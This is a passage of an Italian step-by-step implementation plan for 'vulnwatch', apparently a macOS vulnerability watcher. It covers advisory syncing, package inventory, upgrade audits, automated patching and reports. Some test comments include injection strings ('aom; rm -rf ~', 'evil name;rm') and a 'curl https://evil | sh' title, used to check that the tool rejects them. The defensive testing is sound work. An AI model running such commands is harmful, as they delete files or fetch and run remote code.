- Intervalli: solo quelli di tipo `SEMVER` o `ECOSYSTEM`. Si leggono gli eventi in ordine:
  - `introduced` apre un intervallo;
  - `fixed` o `last_affected` lo chiude;
  - `limit` si ignora.
- `versions` dalla lista esplicita.
- `severity` da `database_specific.severity` in minuscolo; `cvss=None`.
- `malicious = id.startswith("MAL-")`.

**`sync`**, per ogni ecosistema di `ecosystems`. Il parametro viene dalla configurazione, mai dall'inventario.
- **Bootstrap** (manca il cursore `osv_<eco>`):
  1. `download(f"{OSV_BASE}/{eco}/all.zip")` in `tmp_dir`.
  2. Parsa ogni membro `*.json` del file. I membri oltre 5 MB si saltano e si contano come errore.
  3. Imposta il cursore al `modified` massimo.
- **Incrementale:**
  1. `get(f"{OSV_BASE}/{eco}/modified_id.csv")`, con il formato registrato in `endpoints.md`.
  2. Prende le voci con timestamp maggiore del cursore, le ordina **dalla più vecchia** e ne elabora le prime `limit`.
  3. Scarica `f"{OSV_BASE}/{eco}/{id}.json"` per ognuna.
  4. Imposta il cursore al timestamp dell'ultima voce elaborata.

- [ ] **Step 1: scrivi i test.**

```python
# parse_osv(fixture npm) -> ecosystem "npm", package e ranges costruiti
# eventi [intro 0, fixed 1.0.0, intro 2.0.0, fixed 2.5.0] -> due VersionRange
# fixture MAL -> malicious True
# bootstrap: zip creato in tmp con 2 record, route all.zip -> 2 advisory salvati, cursore = modified massimo
# incrementale: cursore impostato, CSV con 3 righe più nuove e 2 più vecchie -> scaricate le 3 dalla più vecchia; cursore = la più recente
# limit=2 -> cursore = la seconda più vecchia; il sync successivo scarica solo la restante
# membro dello zip > 5 MB -> saltato, errore registrato, gli altri salvati
```

- [ ] **Step 2: esegui** `-p 'test_sources_osv.py'`. Atteso: FAIL.
- [ ] **Step 3: implementa** `osv.py`.
- [ ] **Step 4: esegui.** Atteso: PASS.
- [ ] **Step 5: commit** (`feat: fonte OSV in blocco e incrementale`).

---

### Task 8: Inventario di sistema, app, runtime, brew, npm

**Files:**
- Create: `vulnwatch/proc.py`, `vulnwatch/inventory/__init__.py`, `vulnwatch/inventory/system.py`, `vulnwatch/inventory/brew.py`, `vulnwatch/inventory/npm.py`
- Modify: `config/config.json` (`runtimes`)
- Test: `tests/test_inventory.py`

**Interfaces:**
- Produces (`proc.py`):
  - `Runner`: `__call__(argv: List[str], timeout: float, env: Optional[Dict[str, str]] = None) -> subprocess.CompletedProcess`, con `text=True` e output catturato;
  - `FakeRunner(responses: Dict[Tuple[str, ...], CompletedProcess])`, con attributo `calls: List[Tuple[List[str], Optional[Dict]]]`. Un argv sconosciuto → `CompletedProcess(argv, 127, "", "")`.
- Produces (`inventory/system.py`):
  - `macos_item(run) -> InventoryItem`: `kind="macos"`, `name="macos"`, versione da `sw_vers -productVersion`;
  - `apps(app_dirs, run) -> List[InventoryItem]`:
    - legge gli `*.app` al primo livello e il loro `Contents/Info.plist`;
    - `name` = `CFBundleIdentifier`; `version` = `CFBundleShortVersionString`, oppure `CFBundleVersion`;
    - `display_name` = `CFBundleName`;
    - `team_id` dalla riga `TeamIdentifier=` nell'stderr di `codesign -dv --verbose=2 <app>`;
    - `channel="google_updater"` solo per `com.google.Chrome`;
    - un plist illeggibile → l'app si salta;
  - `runtimes(specs, run) -> List[InventoryItem]`:
    - `path` può essere un glob;
    - esegue `<bin> --version` con `env={"PATH": "/usr/bin:/bin"}` e timeout di 10 s;
    - toglie la `v` iniziale; `kind="runtime"`, `name=spec.product`, `location` = percorso reale;
    - un percorso inesistente → si salta.
- Produces (`inventory/brew.py`):
  - `BREW_ENV: Dict[str, str]`, i 5 valori di Global Constraints;
  - `brew_items(info: dict) -> List[InventoryItem]`:
    - formule: `kind="brew_formula"`, versione da `installed[0].version`, `channel=tap`;
    - cask: `kind="brew_cask"`, `name=token`, versione da `installed`, `channel=tap`.
- Produces (`inventory/npm.py`): `npm_globals(prefix) -> List[InventoryItem]`.
  - Legge `lib/node_modules/*/package.json` e `lib/node_modules/@*/*/package.json`.
  - Se il `name` nel `package.json` non coincide con la cartella, il pacchetto si salta.
  - `kind="npm_global"`, `ecosystem="npm"`, `channel="npm_global"`, `location=prefix`.
- Produces (`inventory/__init__.py`): `collect(cfg, run, brew_info: dict) -> List[InventoryItem]`, che unisce tutto quanto sopra. Il Task 9 aggiunge i lockfile.

- [ ] **Step 1: scrivi i test.**

```python
# macos_item con FakeRunner che risponde "27.0.1\n" -> version "27.0.1"
# Fake.app in tmp con Info.plist (com.google.Chrome, "157.0.8089.0", CFBundleName "Google Chrome")
#   + codesign che restituisce stderr "TeamIdentifier=EQHXZ8M8AV" -> channel "google_updater", team_id "EQHXZ8M8AV"
# Info.plist non valido -> app saltata, nessuna eccezione
# due binari presi da un glob, FakeRunner risponde "v22.23.4" -> versioni "22.23.4"; env registrato == {"PATH": "/usr/bin:/bin"}
# brew_items(fixture info_formula) -> channel "homebrew/core"; fixture del cask -> kind "brew_cask"
# prefix tmp con @example/cli e pnpm -> nomi {"@example/cli", "pnpm"}; package.json con name diverso -> saltato
```

- [ ] **Step 2: esegui** `-p 'test_inventory.py'`. Atteso: FAIL.
- [ ] **Step 3: implementa** i moduli.
- [ ] **Step 4: riempi `runtimes`** in `config/config.json` con i percorsi reali trovati sulla macchina (solo `ls`/`find`, nessuna esecuzione):
  - Node di un'app agente con il suo Node in `~/.agent-app/node` e `~/.agent-app/profiles/example/node`;
  - `/usr/local/bin/node`;
  - `~/.example-app/.internal/utils/node`;
  - glob per un'app di coding agent in `~/.cache/example-coding-agent/**/node`;
  - glob per il Node di un'app desktop con Node incorporato;
  - glob per la Bun di `~/.example-tool`.

  Node e Bun di brew restano nell'inventario brew. Aggiungi un test che carica la configurazione e verifica che ogni `product` sia `node` o `bun`.
- [ ] **Step 5: esegui** i test. Atteso: PASS.
- [ ] **Step 6: commit** (`feat: inventario sistema, app, runtime, brew, npm`).

---

### Task 9: Lockfile dei progetti

**Files:**
- Create: `vulnwatch/inventory/lockfiles.py`, `tests/fixtures/lockfiles/*`
- Modify: `vulnwatch/inventory/__init__.py` (`collect` aggiunge `scan(...)`)
- Test: `tests/test_lockfiles.py`

**Interfaces:**
- Produces:
  - `SKIP_DIRS = {"node_modules", ".git", ".claude", ".venv", "venv", "__pycache__", "dist", "build", ".next"}`;
  - `scan(roots, max_depth, protected) -> List[InventoryItem]`: `kind="lockfile_pkg"`, `ecosystem` `"npm"` o `"PyPI"`, `location` = percorso del lockfile;
  - parser che restituiscono `List[Tuple[str, str]]`: `parse_package_lock`, `parse_pnpm_lock`, `parse_yarn_lock`, `parse_bun_lock`, `parse_requirements`.

**Regole di `scan`:**
- non segue i symlink;
- salta i file oltre 20 MB;
- non scende oltre `max_depth`;
- salta qualsiasi percorso dentro `protected`;
- deduplica per `(ecosistema, nome, versione, location)`.

**Regole dei parser:**
- **package-lock v2/v3:** chiavi `"node_modules/…"` di `packages`; il nome è ciò che segue l'ultimo `node_modules/`. Si saltano la chiave `""` e le voci `link: true`. Per la v1: `dependencies`, ricorsivamente.
- **pnpm:** nelle sezioni `packages:` e `snapshots:`, regex `^\s{2}'?/?(@?[^@\s'/]+(?:/[^@\s']+)?)@([^:(\s']+)`.
- **yarn:**
  - classic: l'intestazione con i descrittori, poi `  version "x"`;
  - berry: `  version: x`;
  - il nome è il descrittore prima dell'ultima `@`, con supporto agli scope.
- **bun.lock:** nella sezione `"packages"`, regex `"(@?[^"@/]+(?:/[^"@]+)?)@([^"@]+)"`. Si saltano le versioni che iniziano con `workspace:`, `file:`, `link:`, `github:`.
- **requirements:** solo righe `^([A-Za-z0-9][A-Za-z0-9._-]*)==([^\s;#]+)`. Il nome si normalizza secondo PEP 503: minuscolo, ogni sequenza di `[-_.]` diventa `-`.

- [ ] **Step 1: scrivi i test.** Un test per ogni parser, su una fixture piccola, con la lista esatta di coppie attese (compreso un pacchetto con scope). Poi:

```python
# scan: proj/package-lock.json trovato; proj/node_modules/x/package-lock.json NO; file a profondità max_depth+1 NO
# una cartella symlink verso un progetto -> non seguita
# tmp/Documents/proj/package-lock.json con protected=[tmp/Documents] -> non letto
```

- [ ] **Step 2: esegui** `-p 'test_lockfiles.py'`. Atteso: FAIL.
- [ ] **Step 3: implementa.**
- [ ] **Step 4: esegui.** Atteso: PASS.
- [ ] **Step 5: commit** (`feat: lockfile dei progetti`).

---

### Task 10: Confronto e corsie

**Files:**
- Create: `vulnwatch/match.py`, `vulnwatch/lanes.py`
- Test: `tests/test_match.py`, `tests/test_lanes.py`

**Interfaces:**
- Consumes: `model`, `versions`, `config/aliases.json`.
- Produces (`match.py`):
  - `normalize(s) -> str`: minuscolo, ogni sequenza di caratteri non alfanumerici diventa uno spazio, strip;
  - `Alias(vendor, product, kind, name)`, `load_aliases(path) -> List[Alias]`;
  - `canonical_id(adv) -> str`: il primo `CVE-*` tra id e alias in ordine alfabetico; altrimenti il primo `GHSA-*`; altrimenti l'id;
  - `build_findings(advisories, inventory, aliases, now) -> List[Finding]`.
- Produces (`lanes.py`):
  - `AUTO_CHANNELS = {("brew_formula", "homebrew/core"), ("npm_global", "npm_global")}`;
  - `REASONS: Dict[str, str]`, con esattamente questi codici:

    | Codice | Testo |
    |---|---|
    | `non_kev_non_critica` | "non è KEV né critica secondo una fonte primaria" |
    | `intervallo_non_primario` | "l'intervallo di versioni c'è solo su cve.now" |
    | `canale_manuale` | "canale sempre manuale" |
    | `in_lista_blocco` | "nella lista di blocco" |
    | `corrispondenza_approssimata` | "corrispondenza approssimata, da verificare" |
    | `versione_correzione_ignota` | "nessuna versione corretta nota" |
    | `audit_rosso` | "audit rosso" |
    | `pacchetto_malevolo` | "pacchetto segnalato come malevolo" |

  - `classify(f, hold, ignores) -> Finding`: restituisce una copia con `lane` e `reasons` aggiornati.

**Regole di `build_findings`:**
1. **Calcoli preliminari**, su *tutti* gli advisory:
   - `kev_ids`: i canonical id delle voci con `source == "kev"`;
   - `critical_ids`: i canonical id delle voci `cverecord` con `cvss ≥ 9.0` e delle voci `osv` con `severity == "critical"`.
2. **Affected con ecosistema e pacchetto:** corrisponde agli elementi con lo stesso `ecosystem` e lo stesso nome (per PyPI, confronto dopo la normalizzazione PEP 503). È una corrispondenza `exact`.
3. **Affected con vendor e prodotto:**
   - corrisponde a un alias se `normalize(vendor) == alias.vendor` e `normalize(product)` è uguale ad `alias.product` o comincia con `alias.product + " "`. Allora va agli elementi con lo stesso `(kind, name)` dell'alias, come `exact`;
   - altrimenti, se `normalize(product)` è uguale a `normalize(item.name)` o a `normalize(item.display_name)`, è `approximate`.
4. **Versione:** `affected_by(item.version, ranges, versions, scheme_for(...))`.
   - `False` → nessun finding.
   - `None` → il finding diventa `approximate`.
5. **Raggruppamento** per `(canonical_id, item.kind, item.name, item.location)`:
   - `kev_confirmed = canonical_id in kev_ids`;
   - `critical_confirmed = canonical_id in critical_ids`;
   - `range_source` = la prima fonte, nell'ordine `osv`, `cverecord`, `cvenow`, il cui affected ha deciso `True`;
   - `fixed_version = fixed_for(...)` calcolato su quella fonte;
   - `malicious` = uno qualsiasi degli advisory OSV corrispondenti è malevolo;
   - `title`: prima cvenow, poi osv, poi cverecord, poi kev;
   - `id = finding_id(...)`.

**Ordine di `classify`:**
1. `id` presente in `ignores` → `ignored`.
2. `malicious` → `malicious`, con `pacchetto_malevolo`.
3. `approximate` → `manual`, con `corrispondenza_approssimata`.
4. Nessuna `fixed_version` → `no_patch`, con `versione_correzione_ignota`.
5. Altrimenti si raccolgono i motivi:
   - né KEV né critica confermata → `non_kev_non_critica`;
   - `range_source` non è `osv` né `cverecord` → `intervallo_non_primario`;
   - `(kind, channel)` non è in `AUTO_CHANNELS` → `canale_manuale`;
   - `name` è nella lista di blocco → `in_lista_blocco`.

   Se ce n'è almeno uno → `manual`; altrimenti → `auto`.

- [ ] **Step 1: scrivi i test.**

```python
# OSV npm "pnpm" con fixed 9.1.0 + npm_global pnpm 9.0.0 -> 1 finding: exact, range_source "osv", fixed_version "9.1.0"
# pnpm 9.2.0 -> nessun finding
# kev(vendor "Google", product "Chromium V8") + cverecord dello stesso CVE (Google/Chrome, lessThan "158.0")
#   + app com.google.Chrome 157.0.8089.0 -> kev_confirmed True, range_source "cverecord", fixed_version "158.0"
# prodotto che coincide solo con display_name -> approximate
# nessun intervallo da nessuna fonte -> approximate
# cvenow con kev=True ma nessuna voce kev -> kev_confirmed False      # difesa dal feed avvelenato
# solo cvenow decide -> range_source "cvenow"
# GHSA con alias CVE-2026-1 -> canonical_id "CVE-2026-1"
# lanes: tutte le condizioni vere -> "auto" con reasons == ()
#   hold contiene il nome -> "manual" con in_lista_blocco; range_source "cvenow" -> intervallo_non_primario
#   brew_cask -> canale_manuale; id in ignores -> "ignored"; malicious -> "malicious"
#   tutti i reasons prodotti stanno in REASONS
```

- [ ] **Step 2: esegui.** Atteso: FAIL.
- [ ] **Step 3: implementa.**
- [ ] **Step 4: esegui.** Atteso: PASS.
- [ ] **Step 5: commit** (`feat: confronto locale e corsie`).

---

### Task 11: Audit npm

**Files:**
- Create: `vulnwatch/audit/__init__.py`, `vulnwatch/audit/npm.py`
- Test: `tests/test_audit_npm.py` (packument sintetici)

**Interfaces:**
- Consumes: `Fetcher`, `versions`, `model`.
- Produces (`audit/__init__.py`): `cooldown_check(published_iso: Optional[str], now, hours: int, accept_fresh: bool) -> Check`, con questi esiti:
  - data mancante o illeggibile → `unknown`;
  - data più vecchia di `hours` → `pass`;
  - `accept_fresh` → `pass`, con dettaglio "superato a mano";
  - altrimenti → `fail`.
- Produces (`audit/npm.py`):
  - `REGISTRY = "https://registry.npmjs.org"`;
  - `NPM_NAME_RE = r"^(@[a-z0-9][a-z0-9._~-]*/)?[a-z0-9][a-z0-9._~-]*$"`;
  - `packument_url(name) -> str`: per i pacchetti con scope `/` diventa `%2f`; un nome non valido → `ValueError`;
  - `select_candidate(packument, installed, fixed, now, cooldown_hours, accept_fresh) -> Optional[str]`: la versione più alta che soddisfa tutte queste condizioni:
    - non è una prerelease e non è deprecata;
    - ha la stessa versione maggiore di quella installata;
    - è ≥ `fixed` e > `installed`;
    - è stata pubblicata da almeno `cooldown_hours`, salvo `accept_fresh`;
  - `audit_npm_global(item, fixed_version, fetcher, now, cooldown_hours, owner_node_version, is_malicious: Callable[[str, str], bool], finding_id: str, accept_fresh=False) -> AuditResult`.
- **Controlli, in quest'ordine e con questi nomi:**

  | Nome | Passa se |
  |---|---|
  | `candidate` | esiste un candidato; altrimenti `fail`, con il motivo |
  | `same_major` | stessa versione maggiore |
  | `cooldown` | vedi `cooldown_check` |
  | `maintainers` | l'insieme dei nomi è identico |
  | `publisher` | `_npmUser.name` del candidato è tra i maintainer della versione installata |
  | `install_scripts` | `preinstall`, `install` e `postinstall` sono identici |
  | `new_dependencies` | le chiavi di `dependencies` ∪ `optionalDependencies` del candidato sono incluse in quelle della versione installata |
  | `provenance` | se la versione installata ha `dist.attestations`, ce l'ha anche il candidato |
  | `engines` | `engines.node` è soddisfatto da `owner_node_version` (assente → `pass`; `VersionError` → `unknown`) |
  | `not_malicious` | il candidato non è segnalato come malevolo |
  | `not_deprecated` | il candidato non è deprecato |

  - Se la versione installata non è nel packument, i controlli che la confrontano diventano `unknown`.
  - Se il packument non si scarica → un solo controllo `Check("packument", "error", …)`.
- `evidence`: `integrity`, `published` e `tarball` del candidato.

- [ ] **Step 1: scrivi i test.** Base: installata 1.0.0; candidato 1.1.0 pubblicato 3 giorni fa, con gli stessi maintainer, script e dipendenze; Node 22.23.4.

```python
# la base è verde e candidate_version == "1.1.0"
# pubblicato 10 ore fa -> cooldown "fail"; con accept_fresh -> cooldown "pass"
# maintainer aggiunto -> maintainers "fail"; _npmUser fuori dai maintainer -> publisher "fail"
# postinstall aggiunto -> install_scripts "fail"; nuova dipendenza -> new_dependencies "fail"
# attestations sulla versione installata ma non sul candidato -> provenance "fail"
# engines {"node": ">=24"} -> engines "fail"
# unica versione >= fixed è 2.0.0 -> candidate "fail"; is_malicious -> not_malicious "fail"
assert packument_url("@example/cli") == REGISTRY + "/@example%2fcli"
with self.assertRaises(ValueError): packument_url("evil name;rm")
# risposta 500 al packument -> AuditResult non verde con un unico check "packument" in errore
```

- [ ] **Step 2: esegui.** Atteso: FAIL.
- [ ] **Step 3: implementa.**
- [ ] **Step 4: esegui.** Atteso: PASS.
- [ ] **Step 5: commit** (`feat: audit dei pacchetti npm globali`).

---

### Task 12: Audit brew (formula e cask)

**Files:**
- Create: `vulnwatch/brew_client.py`, `vulnwatch/audit/brew.py`
- Test: `tests/test_audit_brew.py`

**Interfaces:**
- Consumes: `Runner`, `BREW_ENV`, `Fetcher`, `cooldown_check`, `versions`.
- Produces (`brew_client.py`):
  - `DryRun(installs: List[str], upgrades: List[Tuple[str, str, str]])`;
  - `parse_dry_run(text) -> DryRun`:
    - legge le sezioni `==> Would install N dependenc(y|ies):` (righe `nome versione`) e `==> Would upgrade N outdated package(s)` (righe `nome vecchia -> nuova …`);
    - le altre righe e gli avvisi si ignorano;
    - una sezione `==> Would …` sconosciuta → `ValueError`;
  - `BrewClient(run, brew="/opt/homebrew/bin/brew")`, con questi metodi:
    - `info(name, cask=False) -> dict`: il primo oggetto di `brew info --json=v2 [--cask] name`;
    - `dry_run(name, cask=False) -> DryRun`;
    - `services() -> List[dict]`: da `brew services info --all --json`;
    - `bottle_tag() -> str`: da `brew ruby -e 'puts Utils::Bottles.tag.to_s'`;
    - `cellar() -> str`;
    - `keg_source(name, version) -> Optional[str]`: il contenuto di `<cellar>/<name>/<version>/.brew/<name>.rb`;
    - `update()`;
    - `upgrade(name, cask=False)`.
- Produces (`audit/brew.py`):
  - `RUBY_PATH_RE = r"^(Formula|Casks)/[0-9a-z_+.@/-]+\.rb$"`;
  - `last_change(fetcher, repo, path) -> Optional[datetime]`: chiama `https://api.github.com/repos/{repo}/commits?path={path}&per_page=1` e legge `[0].commit.committer.date`, o il campo registrato in `endpoints.md`. Un `path` non valido → `ValueError`;
  - `audit_formula(item, fixed_version, brew, fetcher, now, cooldown_hours, finding_id, accept_fresh=False) -> AuditResult`;
  - `audit_cask(item, fixed_version, brew, fetcher, now, cooldown_hours, finding_id, accept_fresh=False) -> AuditResult`.
- **Controlli di `audit_formula`, in quest'ordine:**

  | Nome | Passa se |
  |---|---|
  | `tap_core` | il tap è `homebrew/core` |
  | `candidate` | il candidato (`versions.stable`, più `_<revision>` se `revision > 0`) è ≥ `fixed` e > della versione installata |
  | `same_major` | stessa versione maggiore |
  | `bottle_available` | `bottle.stable.files` contiene il bottle tag oppure `all` |
  | `dry_run_only_target` | `installs == []` e i nomi degli upgrade sono esattamente `[name]` |
  | `post_install_unchanged` | se `post_install_defined`, il vecchio sorgente nel keg contiene `def post_install` (sorgente assente → `unknown`) |
  | `caveats_unchanged` | se `caveats` c'è, il vecchio sorgente contiene `def caveats` (sorgente assente → `unknown`) |
  | `not_running_service` | la formula non è un servizio con stato `started` |
  | `not_deprecated` | non è deprecata né disattivata |
  | `cooldown` | `last_change(repo="Homebrew/homebrew-core", path=ruby_source_path)` è più vecchio del cooldown (`FetchError`, compreso il 403 → `unknown`) |

- **Controlli di `audit_cask`, in quest'ordine:**
  - `tap_cask`, `candidate`, `dry_run_only_target`;
  - `no_installer_scripts`: in `artifacts` non c'è nessuna chiave tra `pkg`, `installer`, `preflight`, `postflight`, `script`;
  - `not_deprecated`;
  - `cooldown` sul repo `Homebrew/homebrew-cask`.
- `evidence`: `candidate`, `ruby_source_sha256` e `tap_git_head`.

- [ ] **Step 1: scrivi i test.**

```python
# parse_dry_run(fixture dryrun_aom.txt) -> ("aom","3.15.2","3.15.3") tra gli upgrade
# testo sintetico "==> Would install 1 dependency:\nicu4c@79 79.1\n==> Would upgrade 1 outdated package\naom 1 -> 2 (1MB)"
#   -> installs == ["icu4c@79"]
# "==> Would frobnicate" -> ValueError
# formula verde: fixture info + FakeRunner (dry-run con solo aom, servizi vuoti, bottle tag arm64_golden_gate)
#   + commit GitHub di 5 giorni fa -> green
# rossi, uno per test: tap diverso da core; nessun bottle per il tag; il dry-run tocca anche harfbuzz;
#   post_install_defined True con un sorgente senza "def post_install"; caveats nuove; servizio started;
#   deprecated True; commit di 10 ore fa
# GitHub risponde 403 -> cooldown "unknown" e audit non verde      # Review Focus 1
# cask con artifacts [{"pkg": [...]}] -> no_installer_scripts "fail"; cask pulito -> green
```

- [ ] **Step 2: esegui.** Atteso: FAIL.
- [ ] **Step 3: implementa.**
- [ ] **Step 4: esegui.** Atteso: PASS.
- [ ] **Step 5: commit** (`feat: audit brew formula e cask`).

---

### Task 13: Applicazione, rollback e verifiche dopo

**Files:**
- Create: `vulnwatch/apply.py`, `vulnwatch/health.py`
- Test: `tests/test_apply.py`, `tests/test_health.py`

**Interfaces:**
- Consumes: `Config`, `Runner`, `BREW_ENV`, `AuditResult`, `Finding`, `InventoryItem`.
- Produces (`health.py`):
  - `broken_venvs(roots, max_depth=4) -> List[str]`: i `pyvenv.cfg` la cui `home` non esiste;
  - `services_on_old_keg(run, cellar, services: List[dict]) -> List[str]`: per ogni servizio avviato con `pid`, legge `lsof -p <pid> -Fn`. Se compaiono percorsi `<cellar>/<name>/<v>/` con `v` diversa dalla destinazione di `/opt/homebrew/opt/<name>`, il servizio va segnalato;
  - `path_node_version(run, path_node) -> Optional[str]`.
- Produces (`apply.py`):
  - `ApplyError(Exception)`;
  - `NAME_RE = r"^[a-z0-9][a-z0-9+_.@-]*$"` per formule e cask; per npm vale `NPM_NAME_RE`;
  - `VERSION_RE = r"^[0-9A-Za-z][0-9A-Za-z.+_-]*$"`;
  - `can_apply(f: Finding) -> bool`: `True` per brew_formula, brew_cask e npm_global, e per l'app con `name == "com.google.Chrome"`;
  - `argv_for(f, audit, cfg) -> Tuple[List[str], Dict[str, str]]`, con questi template:

    | Bersaglio | argv | env |
    |---|---|---|
    | formula | `[cfg.brew, "upgrade", "--formula", name]` | `BREW_ENV` |
    | cask | `[cfg.brew, "upgrade", "--cask", name]` | `BREW_ENV` |
    | npm | `[cfg.npm_global.npm, "install", "-g", f"{name}@{audit.candidate_version}"]` | `{"PATH": dirname(npm) + ":/usr/bin:/bin", "HOME": home}` |
    | Chrome | `[cfg.google_updater, "--wake"]` | — |

    Nome e versione vanno validati con le regex. Se non corrispondono, o se il tipo non è applicabile → `ApplyError`.
  - `instructions(f) -> str`: testo fisso in italiano per tipo, senza mai testo esterno:
    - `runtime` node: aggiorna la copia `<location>` seguendo la procedura delle copie di Node (copia di un'app agente: tarball ufficiale; `/usr/local/bin/node`: `.pkg` installato con password, fuori da `~/Downloads`);
    - `runtime` bun;
    - `macos`: Impostazioni di Sistema;
    - `app`: updater dell'app o Mac App Store;
    - `lockfile_pkg`: aggiorna la dipendenza in un branch del progetto `<location>`;
    - formula di un tap non core: audit manuale, poi `brew upgrade <name>`;
  - `ApplyContext(cfg, run, now, actions_log: str, reinventory: Callable[[InventoryItem], Optional[InventoryItem]], team_id: Callable[[str], Optional[str]], expected_candidate: Optional[str])`;
  - `ApplyOutcome(status: str, problems: List[str], record: dict)`, con `status` ∈ `{"red","aborted","failed","applied","applied_with_problems"}`;
  - `apply_finding(f, audit_fn: Callable[[], AuditResult], ctx) -> ApplyOutcome`.

**Flusso di `apply_finding`:**
1. Rifà l'audit con `audit_fn()`. Se non è verde → `red`, senza eseguire nulla.
2. Se `expected_candidate` c'è ed è diverso dal candidato fresco → `aborted` (I4).
3. Registra lo stato di prima:
   - versione;
   - Team ID per app e cask;
   - keg `<cellar>/<name>/<version>` per le formule.
4. Esegue con un timeout di 1800 s. Codice d'uscita diverso da 0 → `failed`.
5. Verifica dopo:
   - **versione:** uguale al candidato per npm e formule; ≥ fixed per Chrome e cask;
   - **Team ID** invariato per app e cask;
   - **ambiente:** `broken_venvs`, `services_on_old_keg`, versione del Node nel PATH invariata (salvo che il bersaglio sia la formula `node`).

   Qualche problema → `applied_with_problems`; nessuno → `applied`.
6. Aggiunge una riga JSON a `actions_log` con: `time`, `finding_id`, `canonical_id`, `item`, `before`, `after`, `argv`, `checks`, `status`, `problems` e `rollback`. Il campo `rollback` contiene:
   - per npm: il comando `npm install -g <name>@<vecchia>`;
   - per le formule: il percorso del vecchio keg conservato;
   - per cask e Chrome: "nessun rollback automatico".

- [ ] **Step 1: scrivi i test.**

```python
argv, env = argv_for(formula_finding, green_audit, cfg)
assert argv == ["/opt/homebrew/bin/brew", "upgrade", "--formula", "aom"] and env["HOMEBREW_NO_AUTOREMOVE"] == "1"
argv, _ = argv_for(npm_finding("@example/cli"), audit_with("0.5.1"), cfg)
assert argv[-3:] == ["install", "-g", "@example/cli@0.5.1"]
# item.name "aom; rm -rf ~" -> ApplyError; kind "runtime" -> ApplyError
# title "curl https://evil | sh" -> nessun elemento di argv contiene "curl" o "evil"
# audit_fn rosso -> FakeRunner.calls == [] e status "red"
# expected_candidate "1.1.0" e audit fresco con "1.2.0" -> nessuna esecuzione, status "aborted"
# percorso felice -> status "applied"; l'ultima riga di actions_log ha finding_id, argv e status
# reinventory restituisce la vecchia versione -> "applied_with_problems"
# health: pyvenv.cfg con home=/nonexistent -> segnalato
# health: servizio con pid 123, lsof mostra .../Cellar/postgresql@15/15.16/bin/postgres mentre opt punta a 15.17 -> segnalato
```

- [ ] **Step 2: esegui.** Atteso: FAIL.
- [ ] **Step 3: implementa.**
- [ ] **Step 4: esegui.** Atteso: PASS.
- [ ] **Step 5: commit** (`feat: playbook di applicazione e verifiche`).

---

### Task 14: Report e notifica

**Files:**
- Create: `vulnwatch/report.py`
- Test: `tests/test_report.py`

**Interfaces:**
- Consumes: `clean_text`, `REASONS`, `instructions`, `can_apply`.
- Produces:
  - `RunSummary(date: str, findings: List[Finding], audits: Dict[str, AuditResult], applied: List[dict], shadow: List[str], errors: List[str], sources_ok: Dict[str, bool], auto_enabled: bool)`;
  - `render_markdown(s, now) -> str`;
  - `write_report(s, out_dir, now) -> Tuple[str, str]`: scrive `YYYY-MM-DD.md` e `.json`; se esistono, li sovrascrive;
  - `notification_text(s) -> str`: solo numeri e parole fisse, es. `"2 da approvare · 0 applicate · 1 malevoli"`, oppure `"NESSUN DATO"`;
  - `notify(text, run)`:
    - valida `text` con `^[0-9A-Za-zàèéìòù ,.:·-]*$`, altrimenti `ValueError`;
    - poi esegue `["/usr/bin/osascript", "-e", f'display notification "{text}" with title "vulnwatch"']`.

**Sezioni del report, in quest'ordine:**
1. "⚠️ Pacchetti malevoli"
2. "Applicato automaticamente"
3. "Avrei applicato (modalità ombra)"
4. "Aspetta te"
5. "Senza patch"
6. "Da verificare (corrispondenze approssimate)": un blocco per finding solo se pubblicato da ≤ 30 giorni; i più vecchi diventano una riga di conteggio
7. "Ignorate", con i motivi passati da `clean_text`
8. "Errori e fonti": esito di ogni fonte. Se nessuna fonte ha funzionato, banner `NESSUN DATO: oggi non è stato possibile verificare nulla. Non vuol dire che sei al sicuro.`

**Blocco di ogni finding:**
- intestazione `### <canonical_id> · <kind> <name> <version>`;
- versione corretta e fonte;
- KEV sì/no, critica sì/no;
- motivi presi da `REASONS`;
- tabella `| controllo | esito | dettaglio |`;
- se applicabile, `vulnwatch apply <id>`; altrimenti `instructions(f)`;
- titolo come `> [testo non fidato] <clean_text(title, 200)>`.

Nessun URL esterno nel report.

- [ ] **Step 1: scrivi i test.**

```python
# titolo "\x1b[2J evil ‮" -> il markdown non contiene "\x1b" né "‮"
# tutte le fonti False -> il markdown contiene "NESSUN DATO" e notification_text(s) == "NESSUN DATO"
# shadow == [id] -> il blocco sta sotto "Avrei applicato (modalità ombra)"
# finding runtime -> nessun "vulnwatch apply"; finding npm -> "vulnwatch apply <id>"
# notification_text non contiene il titolo; notify('x"y') -> ValueError
# due approssimate pubblicate 60 giorni fa -> una riga di conteggio, nessun blocco "###"
# json.load del report -> contiene gli id dei finding
```

- [ ] **Step 2: esegui.** Atteso: FAIL.
- [ ] **Step 3: implementa.**
- [ ] **Step 4: esegui.** Atteso: PASS.
- [ ] **Step 5: commit** (`feat: report e notifica`).

---

### Task 15: Auto-controllo e manifest

**Files:**
- Create: `vulnwatch/selfcheck.py`
- Test: `tests/test_selfcheck.py`

**Interfaces:**
- Produces:
  - `MANIFEST_NAME = "manifest.json"`;
  - `write_manifest(root) -> Dict[str, str]`: sha256 di ogni file regolare sotto `root`, con percorsi relativi in ordine, escluso il manifest stesso;
  - `verify(root, plist_path, expect_uid=0, stat=os.lstat) -> List[str]`, che restituisce una lista di problemi in italiano. Segnala:
    - symlink;
    - cartelle `__pycache__`;
    - proprietario diverso da `expect_uid` (file, cartelle, root, plist, manifest);
    - permessi con `& 0o022`;
    - file mancanti o in più;
    - hash diversi;
    - manifest illeggibile.

- [ ] **Step 1: scrivi i test.** In una cartella temporanea, con `expect_uid=os.getuid()`.

```python
# albero pulito + write_manifest -> verify(...) == []
# file modificato -> problema "hash"; file in più -> problema; file mancante -> problema
# chmod 664 su un file -> problema; symlink -> problema; cartella __pycache__ -> problema
# stat finto con st_uid 501 ed expect_uid 0 -> problema "proprietario"
# plist scrivibile dal gruppo -> problema
```

- [ ] **Step 2: esegui.** Atteso: FAIL.
- [ ] **Step 3: implementa.**
- [ ] **Step 4: esegui.** Atteso: PASS.
- [ ] **Step 5: commit** (`feat: auto-controllo con manifest`).

---

### Task 16: Runner, CLI e test di accettazione

**Files:**
- Create: `vulnwatch/runner.py`, `vulnwatch/cli.py`, `vulnwatch.py`
- Test: `tests/test_runner.py`, `tests/test_acceptance.py`

**Interfaces:**
- Consumes: tutti i task precedenti.
- Produces:
  - `RunContext(cfg, fetcher, store, run, brew, now, tmp_dir, dev: bool, selfcheck: Callable[[], List[str]], inventory: Callable[[], List[InventoryItem]], notify: Callable[[str], None], report_dir, actions_log)`;
